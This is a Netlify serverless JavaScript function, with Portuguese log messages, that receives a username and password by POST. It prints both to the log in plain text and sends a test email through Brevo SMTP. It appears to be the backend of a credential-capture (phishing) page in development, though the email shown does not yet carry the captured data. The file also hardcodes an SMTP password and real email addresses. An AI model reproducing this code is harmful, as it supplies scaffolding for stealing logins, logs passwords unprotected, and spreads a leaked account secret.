// netlify/functions/log.js
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
    console.log('🎯 FUNCTION CHAMADA!');
    
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        console.log('📧 DADOS RECEBIDOS:', data.username, data.password);

        // TESTE DIRETO - Email FIXO
        console.log('🔄 ENVIANDO EMAIL TESTE...');
        await enviarEmailTeste();
        console.log('✅ EMAIL TESTE ENVIADO!');

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };

    } catch (error) {
        console.error('❌ ERRO GRAVE:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};

async function enviarEmailTeste() {
    console.log('🔧 CONFIGURANDO BREVO...');
    
    const transporter = nodemailer.createTransport({
        host: 'smtp-relay.brevo.com',
        port: 587,
        secure: false,
        auth: {
            user: 'survivortheweb@gmail.com',
            pass: '3NkLXZIGpS6aBnVj'
        }
    });

    console.log('✅ TRANSPORTER CRIADO');

    const mailOptions = {
        from: '"TESTE" <survivortheweb@gmail.com>',
        to: 'ofelipeoliveira.rodrigues@gmail.com',
        subject: '🧪 TESTE DIRETO - Funciona?',
        html: `
            <h1>✅ TESTE DIRETO DA FUNCTION</h1>
            <p>Se este email chegou, a function está funcionando!</p>
            <p><strong>Data:</strong> ${new Date().toLocaleString('pt-BR')}</p>
        `
    };

    console.log('📤 ENVIANDO EMAIL...');
    const info = await transporter.sendMail(mailOptions);
    console.log('✅ EMAIL ENVIADO:', info.messageId);
}